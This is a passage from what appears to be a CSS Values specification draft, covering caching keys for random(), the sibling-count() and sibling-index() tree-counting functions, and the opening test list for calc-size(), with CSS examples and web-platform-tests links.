 name](#random-cache-name) is used to achieve this. It can literally cache a
 generated random value, or be used as a seed for a PRNG, etc.

- A [random cache name](#random-cache-name) is a
 [tuple](https://infra.spec.whatwg.org/#tuple) of:

 1. A nullable
 [string](https://infra.spec.whatwg.org/#string) name: the value of the
 [\<dashed-ident\>](https://drafts.csswg.org/css-values-4/#typedef-dashed-ident), if specified; otherwise null.

 2. A nullable
 [string](https://infra.spec.whatwg.org/#string) property/index value: the value of the
 [\<random-ua-ident\>](#typedef-random-ua-ident), if specified/calculated;
 otherwise null.

 3. A nullable /element identifier/ uniquely identifying the object
 the style is being applied to (the
 [`Element`](https://dom.spec.whatwg.org/#element),
 [pseudo-element](https://drafts.csswg.org/selectors-4/#pseudo-element), or [custom
 function](https://drafts.csswg.org/css-mixins-1/#custom-function) evaluation's \"hypothetical element\"), if
 [element-scoped](#valdef-random-element-scoped) is specified; otherwise null.

 4. A /document identifier/ identifying the
 [`Document`](https://dom.spec.whatwg.org/#document) the styles are from.

 The /element identifier/ and /document identifier/ must have the same
 lifetimes and equivalence semantics as a JavaScript reference to the
 [`Element`](https://dom.spec.whatwg.org/#element) or
 [`Document`](https://dom.spec.whatwg.org/#document).

 (#issue-0dcd6797) The behavior for pseudo-elements needs
 to be clarified.

- The [random cache
 name](#random-cache-name) and [random base
 value](#random-base-value) must be determined by [computed
 value](https://drafts.csswg.org/css-cascade-5/#computed-value) time, before
 [inheritance](https://drafts.csswg.org/css-cascade-5/#css-inheritance), so that a random function that is unresolved by
 inheritance time (due to containing, for example, a layout-sensitive
 percentage) does not have a different behavior on children than one
 that resolves immediately.

Shorthands are recorded as part of the
[random cache name](#random-cache-name), rather than the longhand the value gets expanded to.
For example:

``` highlight
.same-tb-same-rl {
 margin: random(0px, 10px) random(0px, 10px);
}
```

Here, the
[\<random-ua-ident\>](#typedef-random-ua-ident) part of the [random cache
name](#random-cache-name)
is \"ua-margin-1\" and \"ua-margin-2\", respectively. After expansion,
then,
[margin-top](https://drafts.csswg.org/css-box-4/#propdef-margin-top) and
[margin-bottom](https://drafts.csswg.org/css-box-4/#propdef-margin-bottom) will share the same random value,
and
[margin-left](https://drafts.csswg.org/css-box-4/#propdef-margin-left) and
[margin-right](https://drafts.csswg.org/css-box-4/#propdef-margin-right) will share a different random
value.

Combining shorthands with longhands will produce different caching keys:

``` highlight
.different-tb-same-rl {
 margin: random(0px, 10px) random(0px, 10px);
 margin-bottom: random(0px, 10px);
}
```

The
[margin-bottom](https://drafts.csswg.org/css-box-4/#propdef-margin-bottom) value has a [random cache
name](#random-cache-name)
[\<random-ua-ident\>](#typedef-random-ua-ident) of
`"ua-margin-bottom-1"`, which is different from the
[margin-top](https://drafts.csswg.org/css-box-4/#propdef-margin-top) key of `"ua-margin-1"`,
so the top and bottom margins will be different random values.
[margin-left](https://drafts.csswg.org/css-box-4/#propdef-margin-left) and
[margin-right](https://drafts.csswg.org/css-box-4/#propdef-margin-right) continue to share a third random
value `"ua-margin-2"`, as they still share the name
`"margin"` property name and `2` index.

The evaluation semantics of [custom
properties](https://drafts.csswg.org/css-variables-2/#custom-property) can make [random
functions](#css-random-function) act a little unpredictably if you're not careful.

For example, in the following:

``` highlight
.square-or-rect {
 --size: random(100px, 500px);
 width: var(--size);
 height: var(--size);
}
```

If [\--size] isn't a [registered custom
property](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property), or is registered but with the universal grammar
[\*](https://drafts.csswg.org/selectors-3/#x), the
[random()](#funcdef-random) function isn't evaluated (or even recognized \*as\* a
[random()] function) in [\--size],
so the default rules for an omitted
[\<random-key\>](#typedef-random-key) aren't applied. Instead, it's evaluated
when it's substituted into
[width](https://drafts.csswg.org/css-sizing-3/#propdef-width) and
[height](https://drafts.csswg.org/css-sizing-3/#propdef-height), so each gets a distinct [random
cache name](#random-cache-name), and this ends up defining a random *rectangle*, rather
than a square.

Similarly,
[element-scoped](#valdef-random-element-scoped) in the
[\<random-key\>](#typedef-random-key) won't cause the function to determine its
\"element identifier\" until substitution actually happens---​which might
be *after* [\--size] has inherited through multiple elements---​so
again multiple elements using [var(\--size)] would end up with
distinct random values rather than sharing one value defined on their
ancestor.

The first issue can be resolved, if desired, by specifying a
[\<dashed-ident\>](https://drafts.csswg.org/css-values-4/#typedef-dashed-ident) explicitly, rather than relying on
the defaulting rules.

Both issues can be resolved by instead using a [registered custom
property](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property) with a non-universal grammar, so the
[random()](#funcdef-random) function will be parsed and evaluated by the [custom
property](https://drafts.csswg.org/css-variables-2/#custom-property) (gaining a
[\<random-ua-ident\>](#typedef-random-ua-ident) of \"ua\-\--size-1\"), and then the
resolved random value will be substituted into each property.

#### 9.4.1. Simplification of [\<random-key\>]
At parse time, certain transformations are performed on the
[\<random-key\>](#typedef-random-key) of a [random
function](#css-random-function):

- If the
 [\<random-key\>](#typedef-random-key) is
 [auto](#valdef-random-auto) (or omitted), it's turned into [element-scoped
 property-index-scoped]. (And then subject to the below
 transformations.)

- If the
 [\<random-key\>](#typedef-random-key) contains
 [property-scoped](#valdef-random-property-scoped) or
 [property-index-scoped](#valdef-random-property-index-scoped), that keyword is replaced by a
 [\<random-ua-ident\>](#typedef-random-ua-ident): either [ua-PROPERTY] with
 PROPERTY being the property the value was parsed as, or
 [ua-PROPERTY-INDEX] with PROPERTY as the previous and INDEX
 being the 1-indexed integer index of this [random
 function](#css-random-function) among all [random
 functions] being used in the
 declaration.

 The INDEX value is based on the ordering in the parsed value, before
 any canonicalization/reordering might occur that could shuffle the
 values around.

In certain cases, the
[\<random-ua-ident\>](#typedef-random-ua-ident) is slightly more complex:

- when evaluated inside of a [custom
 function](https://drafts.csswg.org/css-mixins-1/#custom-function) (in a property with a type that causes evaluation,
 such as a typed argument or a typed
 [result](https://drafts.csswg.org/css-mixins-1/#descdef-function-result)), in addition to the PROPERTY and/or
 INDEX, the function's name is captured in the ident:
 [ua-FUNCTIONNAME-PROPERTY] or
 [ua-FUNCTIONNAME-PROPERTY-INDEX].

 This ensures that different functions that just
 happen to use the same internal variable names don't accidentally tie
 their random values together.

 :::
 (#example-69ace575)
 For example, given the following custom function and usage:

 ``` highlight
 @function --ex(--arg <length>) returns <length> {
 --local: random(2px, 3px);
 result: calc(var(--arg) + var(--local) + random(3px, 4px));
 }
 .foo {
 width: --ex(random(1px, 2px));
 }
 ```

 The [\--arg] is registered as a
 [\<length\>](https://drafts.csswg.org/css-values-4/#length-value), so it's value is evaluated within
 the [\--arg] property, getting a
 [\<random-ua-ident\>](#typedef-random-ua-ident) of [ua\-\--ex\-\--arg-1].

 The [\--local] is *not* registered, so it doesn't evaluate the
 [random()](#funcdef-random) at all; it's left as-is until substitution.

 The
 [result](https://drafts.csswg.org/css-mixins-1/#descdef-function-result) is also registered as a
 [\<length\>](https://drafts.csswg.org/css-values-4/#length-value). Both the [random(2px, 3px)]
 (from [\--local] substitution) and [random(3px, 4px)]
 (written literally) evaluate within
 [result], getting
 [\<random-ua-ident\>](#typedef-random-ua-ident)s of [ua\-\--ex-result-1] and
 [ua\-\--ex-result-2].
 :::

 :::
 (#example-f2b6d6c8) On the other hand, in this example:
 ``` highlight
 @function --no-types(--arg) {
 result: calc(var(--arg) + random(2px, 3px));
 }
 .foo {
 width: --no-types(random(1px, 2px));
 }
 ```

 Neither the [\--arg] argument nor the
 [result](https://drafts.csswg.org/css-mixins-1/#descdef-function-result) are typed, so their values aren't
 evaluated within the function. The function call substitutes itself
 with the value [calc(random(1px, 2px) + random(2px, 3px))],
 which is then evaluated within
 [width](https://drafts.csswg.org/css-sizing-3/#propdef-width), getting
 [\<random-ua-ident\>](#typedef-random-ua-ident)s of [ua-width-1] and
 [ua-width-2] instead.
 :::

- when evaluated inside of an [arbitrary substitution
 function](#arbitrary-substitution-function) as part of the substitution process, the prefix is
 [ua-early-] rather than just [ua-]:
 [ua-early-PROPERTY] or [ua-early-PROPERTY-INDEX].

 Additionally, if the INDEX portion is included in the ident, it is
 incremented *separately* from non-\"early\" usage (that is, the
 \"early\" usage counts up from 1, then non-\"early\" usage will also
 count up from 1) and increments across substitutions in the property
 (that is, multiple different [arbitrary substitution
 functions](#arbitrary-substitution-function) will use successive indexes, rather than resetting to
 1 for each substitution).

 :::
 (#example-964bd253) For example, in this relatively
 complex value:
 ``` highlight
 .foo {
 width: calc(
 if(
 style(/*eA*/random(auto, ...) < 0.5):
 /*lA*/random(auto, ...);
 else:
 /*lB*/random(auto, ...))
 )
 +
 if(
 style(/*eB*/random(auto, ...) < 0.5):
 /*lC*/random(auto, ...);
 else:
 /*lD*/random(auto, ...))
 )
 );
 }
 ```

 During
 [replacement](#replace-an-arbitrary-substitution-function), the tests of both
 [if()](#funcdef-if)s are
 parsed (since using [==] or [\>] provides a numeric
 context, giving the UA the necessary knowledge to evaluate them),
 resulting in, effectively, the following code:

 ``` highlight
 .foo {
 width: calc(
 if(
 style(/*eA*/random(element-scoped ua-early-width-1, ...) < 0.5):
 /*lA*/random(auto, ...);
 else:
 /*lB*/random(auto, ...))
 )
 +
 if(
 style(/*eB*/random(element-scoped ua-early-width-2, ...) < 0.5):
 /*lC*/random(auto, ...);
 else:
 /*lD*/random(auto, ...))
 )
 );
 }
 ```

 That is, the two values in the tests have distinct
 [\<random-ua-ident\>](#typedef-random-ua-ident)s, and will be element-scoped as
 well, so every instance on every element will evaluate to distinct
 values.

 Based on these random values, each
 [if()](#funcdef-if) will
 substitute itself with one of its two (unevaluated) branches. When
 these are then parsed according to the
 [width](https://drafts.csswg.org/css-sizing-3/#propdef-width) grammar, they will receive
 \"normal\"
 [\<random-ua-ident\>](#typedef-random-ua-ident)s with their indexes restarting from
 1, effectively:

 ``` highlight
 .foo {
 width: calc(
 /*lA*/random(element-scoped ua-width-1, ...)
 +
 /*lD*/random(element-scoped ua-width-2, ...)
 )
 );
 }
 ```

 Since these are using different
 [\<random-ua-ident\>](#typedef-random-ua-ident)s than the \"early\" ones, their
 random values will be distinct as well.
 :::

These additional modifiers can be combined. For example, if a [random(0,
1)] is evaluated in the test of an
[if()](#funcdef-if) used
in the
[result](https://drafts.csswg.org/css-mixins-1/#descdef-function-result) of a custom function named
[\--foo()], the
[\<random-ua-ident\>](#typedef-random-ua-ident) will be
[ua-early\-\--foo-result-1].

If the
[\<random-key\>](#typedef-random-key) contains a
[\<random-ua-ident\>](#typedef-random-ua-ident), this must not be omitted in the
serialization of the value, even if this would normally be valid per the
[\"shortest serialization
principle\"](https://drafts.csswg.org/cssom-1/#serialize-a-css-value).

For example, specifying [margin:
random(10px, 20px) random(10px,
20px)](https://drafts.csswg.org/css-box-4/#propdef-margin) will cause the top and bottom margins to be
one random value, and the left and right margins to be another random
value. The omitted
[\<random-key\>](#typedef-random-key)s get rewritten at parse-time to
[element-scoped ua-margin-1] and [element-scoped
ua-margin-2], respectively, before they expand into the
[margin] longhands.

This way, the
[margin-top](https://drafts.csswg.org/css-box-4/#propdef-margin-top) and
[margin-bottom](https://drafts.csswg.org/css-box-4/#propdef-margin-bottom) longhands will both contain the key
[element-scoped ua-margin-1], ensuring that the two values remain
linked even if you read and then set the value back.

The [random base value](#random-base-value) of a [random
function](#css-random-function) is generally known at [specified
value](https://drafts.csswg.org/css-cascade-5/#specified-value) time, once it's known which element the function is
being applied to. As a [math
function](https://drafts.csswg.org/css-values-4/#math-function), a
[random()](#funcdef-random) function can be
[simplified](https://drafts.csswg.org/css-values-4/#simplify-a-calculation-tree) as soon as its argument
[calculations](https://drafts.csswg.org/css-values-4/#calc-calculation) can be simplified to compatible numeric values. If a
[random()] function can't be fully
[simplified] by [computed
value](https://drafts.csswg.org/css-cascade-5/#computed-value) time, then its arguments are maximally simplified, and
its specified
[\<random-key\>](#typedef-random-key) is replaced with [fixed BASE], where
[BASE] is the function's [random base
value].

 As an [arbitrary substitution
function](#arbitrary-substitution-function),
[random-item()](#funcdef-random-item) is always replaced at [computed
value](https://drafts.csswg.org/css-cascade-5/#computed-value) time.

For example, given the declaration
[width: random(100px,
100%)](https://drafts.csswg.org/css-sizing-3/#propdef-width), the calculations can't be simplified at
[computed
value](https://drafts.csswg.org/css-cascade-5/#computed-value) time because the percentage depend on [used
value](https://drafts.csswg.org/css-cascade-5/#used-value) information (the size of the element's [containing
block](https://drafts.csswg.org/css-display-4/#containing-block), to resolve the [100%] against).

So, the [computed
value](https://drafts.csswg.org/css-cascade-5/#computed-value) of the property becomes something like [width:
random(fixed .1234, 100px,
100%)](https://drafts.csswg.org/css-sizing-3/#propdef-width). Once the [100%] is resolved to a
length (say, [500px]), the function will be able to fully simplify
(to [149.36px]).

## 10. Tree Counting Functions: the [sibling-count() and [sibling-index()](#funcdef-sibling-index) notations]
Tests

- [calc-sibling-function-in-shadow-dom.html](https://wpt.fyi/results/css/css-values/tree-counting/calc-sibling-function-in-shadow-dom.html "css/css-values/tree-counting/calc-sibling-function-in-shadow-dom.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/calc-sibling-function-in-shadow-dom.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/calc-sibling-function-in-shadow-dom.html)
- [calc-sibling-function-parsing.html](https://wpt.fyi/results/css/css-values/tree-counting/calc-sibling-function-parsing.html "css/css-values/tree-counting/calc-sibling-function-parsing.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/calc-sibling-function-parsing.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/calc-sibling-function-parsing.html)
- [calc-sibling-function.html](https://wpt.fyi/results/css/css-values/tree-counting/calc-sibling-function.html "css/css-values/tree-counting/calc-sibling-function.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/calc-sibling-function.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/calc-sibling-function.html)
- [sibling-function-container-query-invalidation.html](https://wpt.fyi/results/css/css-values/tree-counting/sibling-function-container-query-invalidation.html "css/css-values/tree-counting/sibling-function-container-query-invalidation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/sibling-function-container-query-invalidation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/sibling-function-container-query-invalidation.html)
- [sibling-function-container-query.html](https://wpt.fyi/results/css/css-values/tree-counting/sibling-function-container-query.html "css/css-values/tree-counting/sibling-function-container-query.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/sibling-function-container-query.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/sibling-function-container-query.html)
- [sibling-function-invalidation.html](https://wpt.fyi/results/css/css-values/tree-counting/sibling-function-invalidation.html "css/css-values/tree-counting/sibling-function-invalidation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/sibling-function-invalidation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/sibling-function-invalidation.html)
- [sibling-index-keyframe-font-style-dynamic.html](https://wpt.fyi/results/css/css-values/tree-counting/sibling-index-keyframe-font-style-dynamic.html "css/css-values/tree-counting/sibling-index-keyframe-font-style-dynamic.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/sibling-index-keyframe-font-style-dynamic.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/sibling-index-keyframe-font-style-dynamic.html)
- [sibling-index-keyframe-font-variation-settings-dynamic.html](https://wpt.fyi/results/css/css-values/tree-counting/sibling-index-keyframe-font-variation-settings-dynamic.html "css/css-values/tree-counting/sibling-index-keyframe-font-variation-settings-dynamic.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/sibling-index-keyframe-font-variation-settings-dynamic.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/sibling-index-keyframe-font-variation-settings-dynamic.html)
- [sibling-index-keyframe-font-weight-dynamic.html](https://wpt.fyi/results/css/css-values/tree-counting/sibling-index-keyframe-font-weight-dynamic.html "css/css-values/tree-counting/sibling-index-keyframe-font-weight-dynamic.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/sibling-index-keyframe-font-weight-dynamic.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/sibling-index-keyframe-font-weight-dynamic.html)
- [sibling-index-keyframe-length-value-dynamic.html](https://wpt.fyi/results/css/css-values/tree-counting/sibling-index-keyframe-length-value-dynamic.html "css/css-values/tree-counting/sibling-index-keyframe-length-value-dynamic.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/sibling-index-keyframe-length-value-dynamic.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/sibling-index-keyframe-length-value-dynamic.html)
- [sibling-index-keyframe-palette-mix-dynamic.html](https://wpt.fyi/results/css/css-values/tree-counting/sibling-index-keyframe-palette-mix-dynamic.html "css/css-values/tree-counting/sibling-index-keyframe-palette-mix-dynamic.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/sibling-index-keyframe-palette-mix-dynamic.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/sibling-index-keyframe-palette-mix-dynamic.html)
- [sibling-index-keyframe-percent-dynamic.html](https://wpt.fyi/results/css/css-values/tree-counting/sibling-index-keyframe-percent-dynamic.html "css/css-values/tree-counting/sibling-index-keyframe-percent-dynamic.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/sibling-index-keyframe-percent-dynamic.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/sibling-index-keyframe-percent-dynamic.html)
- [sibling-index-keyframe-registered-properties-dynamic.html](https://wpt.fyi/results/css/css-values/tree-counting/sibling-index-keyframe-registered-properties-dynamic.html "css/css-values/tree-counting/sibling-index-keyframe-registered-properties-dynamic.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/sibling-index-keyframe-registered-properties-dynamic.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/sibling-index-keyframe-registered-properties-dynamic.html)
- [sibling-index-keyframe-rotate-dynamic.html](https://wpt.fyi/results/css/css-values/tree-counting/sibling-index-keyframe-rotate-dynamic.html "css/css-values/tree-counting/sibling-index-keyframe-rotate-dynamic.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/sibling-index-keyframe-rotate-dynamic.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/sibling-index-keyframe-rotate-dynamic.html)
- [sibling-index-keyframe-scale-dynamic.html](https://wpt.fyi/results/css/css-values/tree-counting/sibling-index-keyframe-scale-dynamic.html "css/css-values/tree-counting/sibling-index-keyframe-scale-dynamic.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/sibling-index-keyframe-scale-dynamic.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/sibling-index-keyframe-scale-dynamic.html)
- [sibling-index-keyframe-transform-dynamic.html](https://wpt.fyi/results/css/css-values/tree-counting/sibling-index-keyframe-transform-dynamic.html "css/css-values/tree-counting/sibling-index-keyframe-transform-dynamic.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/sibling-index-keyframe-transform-dynamic.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/sibling-index-keyframe-transform-dynamic.html)
- [sibling-index-keyframe-value-dynamic.html](https://wpt.fyi/results/css/css-values/tree-counting/sibling-index-keyframe-value-dynamic.html "css/css-values/tree-counting/sibling-index-keyframe-value-dynamic.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/sibling-index-keyframe-value-dynamic.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/sibling-index-keyframe-value-dynamic.html)
- [sibling-index-linear-gradient-gcs.html](https://wpt.fyi/results/css/css-values/tree-counting/sibling-index-linear-gradient-gcs.html "css/css-values/tree-counting/sibling-index-linear-gradient-gcs.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/sibling-index-linear-gradient-gcs.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/sibling-index-linear-gradient-gcs.html)
- [tree-scoped-sibling-function.html](https://wpt.fyi/results/css/css-values/tree-counting/tree-scoped-sibling-function.html "css/css-values/tree-counting/tree-scoped-sibling-function.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/tree-scoped-sibling-function.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/tree-scoped-sibling-function.html)
- [trig-functions-with-runtime-angle-arguments.html](https://wpt.fyi/results/css/css-values/tree-counting/trig-functions-with-runtime-angle-arguments.html "css/css-values/tree-counting/trig-functions-with-runtime-angle-arguments.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/trig-functions-with-runtime-angle-arguments.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/trig-functions-with-runtime-angle-arguments.html)

The [sibling-count()] [functional
notation](https://drafts.csswg.org/css-values-4/#functional-notation) represents, as an
[\<integer\>](https://drafts.csswg.org/css-values-4/#integer-value), the total number of child
[elements](https://drafts.csswg.org/css-display-3/#elements) in the parent of the element on which the notation is
used.

The [sibling-index()] [functional
notation](https://drafts.csswg.org/css-values-4/#functional-notation) represents, as an
[\<integer\>](https://drafts.csswg.org/css-values-4/#integer-value), the index of the element on which
the notation is used among its [inclusive
siblings](https://dom.spec.whatwg.org/#concept-tree-inclusive-sibling). Like
[:nth-child()](https://drafts.csswg.org/selectors-4/#nth-child-pseudo),
[sibling-index()](#funcdef-sibling-index) is 1-indexed.

Together, these are known as the [tree-counting
functions].

 The
[counter()](https://drafts.csswg.org/css-lists-3/#funcdef-counter) function can provide similar abilities as
[sibling-index()](#funcdef-sibling-index), but returns a
[\<string\>](https://drafts.csswg.org/css-values-4/#string-value) rather than an
[\<integer\>](https://drafts.csswg.org/css-values-4/#integer-value).

When used on an [element-backed
pseudo-element](https://drafts.csswg.org/css-pseudo-4/#element-backed) that is also a real element, the [tree-counting
functions](#tree-counting-functions) resolve for that real element. For other
[pseudo-elements](https://drafts.csswg.org/selectors-4/#pseudo-element), they resolve as if they were resolved against the
[ultimate originating
element](https://drafts.csswg.org/selectors-4/#ultimate-originating-element).

A [tree-counting
function](#tree-counting-functions) is a type of
[loosely-matched](https://drafts.csswg.org/css-shadow-1/#tree-scoped-name-loosely-matched) [tree-scoped
reference](https://drafts.csswg.org/css-shadow-1/#css-tree-scoped-reference), which is resolved as if the element were given an
automatic [tree-scoped
name](https://drafts.csswg.org/css-shadow-1/#css-tree-scoped-name) that matches an identical automatic name on the
[tree-scoped reference] of the
[tree-counting function]. If the
reference fails to match (because the element is, for example, in a
descendent shadow tree from the stylesheet), the function returns 0.

 This restriction is to avoid leaking shadow tree
information to outer
[trees](https://dom.spec.whatwg.org/#concept-tree).

The following examples show how
[sibling-index()](#funcdef-sibling-index) resolves for
[pseudo-elements](https://drafts.csswg.org/selectors-4/#pseudo-element) and across [shadow
tree](https://dom.spec.whatwg.org/#concept-shadow-tree) boundaries:

```
#target {
 /* Based on the sibling-index() of #target */
 width: calc(sibling-index() * 10px);
}
#target::before {
 /* Based on the sibling-index() of #target */
 width: calc(sibling-index() * 10px);
}
#target::before::marker {
 /* Based on the sibling-index() of #target */
 width: calc(sibling-index() * 10px);
}
::slotted(*)::before {
 /* Based on the sibling-index() of the slotted element in the outer tree */
 width: calc(sibling-index() * 10px);
}
::part(my-part) {
 /* Returns 0px, because referencing a shadow tree */
 width: calc(sibling-index() * 10px);
}
:host {
 /* Based on the host's sibling-index() in the outer tree */
 width: calc(sibling-index() * 10px);
}
```

[:nth-child()](https://drafts.csswg.org/selectors-4/#nth-child-pseudo) and other counting selectors, the [tree-counting
functions](#tree-counting-functions) operate on the DOM tree, rather than the [flat
tree](https://drafts.csswg.org/css-shadow-1/#flat-tree) like most CSS operations do. They may, in the future,
have variants that support counting [flat tree]
siblings.

 These functions may, in the future, be extended to
accept an [of
[\<complex-real-selector-list\>](https://drafts.csswg.org/selectors-4/#typedef-complex-real-selector-list)] argument, similar to
[:nth-child()](https://drafts.csswg.org/selectors-4/#nth-child-pseudo), to filter on a subset of the children.

## 11. Calculating With Intrinsic Sizes: the [calc-size() function]
Tests

- [calc-size-aspect-ratio-001.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-aspect-ratio-001.html "css/css-values/calc-size/calc-size-aspect-ratio-001.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-aspect-ratio-001.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-aspect-ratio-001.html)
- [calc-size-aspect-ratio-002.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-aspect-ratio-002.html "css/css-values/calc-size/calc-size-aspect-ratio-002.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-aspect-ratio-002.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-aspect-ratio-002.html)
- [calc-size-aspect-ratio-003.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-aspect-ratio-003.html "css/css-values/calc-size/calc-size-aspect-ratio-003.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-aspect-ratio-003.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-aspect-ratio-003.html)
- [calc-size-aspect-ratio-004.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-aspect-ratio-004.html "css/css-values/calc-size/calc-size-aspect-ratio-004.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-aspect-ratio-004.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-aspect-ratio-004.html)
- [calc-size-aspect-ratio-005.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-aspect-ratio-005.html "css/css-values/calc-size/calc-size-aspect-ratio-005.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-aspect-ratio-005.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-aspect-ratio-005.html)
- [calc-size-flex-001.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-flex-001.html "css/css-values/calc-size/calc-size-flex-001.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-flex-001.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-flex-001.html)
- [calc-size-flex-002.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-flex-002.html "css/css-values/calc-size/calc-size-flex-002.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-flex-002.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-flex-002.html)
- [calc-size-flex-003.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-flex-003.html "css/css-values/calc-size/calc-size-flex-003.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-flex-003.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-flex-003.html)
- [calc-size-flex-004.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-flex-004.html "css/css-values/calc-size/calc-size-flex-004.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-flex-004.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-flex-004.html)
- [calc-size-flex-005.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-flex-005.html "css/css-values/calc-size/calc-size-flex-005.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-flex-005.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-flex-005.html)
- [calc-size-flex-006.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-flex-006.html "css/css-values/calc-size/calc-size-flex-006.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-flex-006.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-flex-006.html)
- [calc-size-flex-007.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-flex-007.html "css/css-values/calc-size/calc-size-flex-007.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-flex-007.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-flex-007.html)
- [calc-size-flex-008.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-flex-008.html "css/css-values/calc-size/calc-size-flex-008.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-flex-008.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-flex-008.html)
- [calc-size-flex-009.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-flex-009.html "css/css-values/calc-size/calc-size-flex-009.html")
 [[(live
 test)]](http://wpt.live/css/css-values/calc-size/calc-size-flex-009.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/calc-size/calc-size-flex-009.html)
- [calc-size-flex-basis-on-column.html](https://wpt.fyi/results/css/css-values/calc-size/calc-size-flex-basis-on-column.html "css/css-values/calc-size/calc-size-flex-basis-on-column.html")
 [[(live
